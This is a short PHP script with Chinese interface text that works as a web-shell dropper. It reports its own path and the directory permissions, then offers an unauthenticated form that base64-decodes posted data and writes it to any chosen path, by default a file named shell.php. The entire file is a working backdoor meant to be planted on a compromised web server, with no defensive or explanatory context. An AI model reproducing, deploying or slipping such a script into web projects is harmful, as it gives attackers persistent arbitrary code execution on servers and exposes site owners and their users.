<?php

error_reporting(E_ERROR);

header('Content-Type:text/html; charset=utf-8');

$path=getcwd();

$perms=substr(sprintf('%o',fileperms($path)),-4);

echo 'Power By 天启:550710418<br />';

echo '本程序路径： '.__FILE__.'<br />';

echo '当前目录权限： '.$perms;

print<<<END

	<form method='post'>

		<textarea name='code' rows='15' lows='40'></textarea><br />

	保存路径：<input type='text' name='uppath' /><br />

		<input type='submit' name='submit' value='上传' />

		 

<input type='reset' name='reset' value='重置' />

</form>

END;

if(strlen($_POST['code'])>0){

	$code=base64_decode($_POST['code']);

	$uppath=empty($_POST['uppath'])?$path.'/shell.php':trim($_POST['uppath']);

	$handle=fopen($uppath,'w') or die('创建文件失败');

	fwrite($handle,$code) or die('写入文件失败');

	fclose($handle);

	echo '文件上传成功';

}

else

	echo '请将数据经base64编码后在上传';

?>
